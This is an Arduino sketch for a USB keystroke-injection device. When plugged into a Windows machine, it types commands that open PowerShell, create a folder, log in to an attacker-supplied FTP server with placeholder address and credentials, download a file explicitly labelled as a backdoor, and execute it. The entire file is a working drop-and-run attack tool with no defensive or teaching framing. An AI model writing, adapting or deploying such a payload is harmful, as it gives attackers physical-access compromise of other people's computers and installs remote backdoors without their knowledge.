#include <Keyboard.h> 


void setup()
{
  Keyboard.begin();

  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(500);

  typeKey(KEY_RETURN);

  delay(750);
  Keyboard.print("cd /");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("mkdir blo");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("cd blo");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("ftp");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("open IPFTP PORT");
  //ip and port for ftp
  typeKey(KEY_RETURN);
  delay(3000);
  Keyboard.print("USER");
  //ftp user
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("PASSWORD");
  //ftp password
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("bin");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("get BACKDOORNAME");
  //backdoor name
  typeKey(KEY_RETURN);
  delay(5000);
  Keyboard.print("close");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("bye");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print(".BACKDOORNAME");
  //backdoor name
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void loop() {}
